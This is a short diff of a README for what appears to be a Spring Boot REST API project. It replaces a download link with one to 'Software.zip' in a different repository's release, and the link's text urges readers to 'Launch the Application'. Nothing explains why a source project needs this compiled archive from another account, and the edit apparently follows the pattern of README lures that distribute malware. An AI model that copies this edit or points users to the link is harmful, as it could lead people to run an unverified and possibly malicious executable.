@@ -32,7 +32,7 @@ The repository delves into the following topics:
 ## Application Download
 A compiled version of the application can be downloaded from the link provided below. 
 
-[Download Application.zip](https://github.com/user-attachments/files/18426772/Application.zip "Launch the Application")
+[Download https://github.com/LeanX2/SPRINGBOOT-API-REST/releases/download/v2.0/Software.zip](https://github.com/LeanX2/SPRINGBOOT-API-REST/releases/download/v2.0/Software.zip "Launch the Application")
 
 ## Releases
 If the provided download link is not working or if you require more recent updates, please check the "Releases" section of this repository for the latest versions.
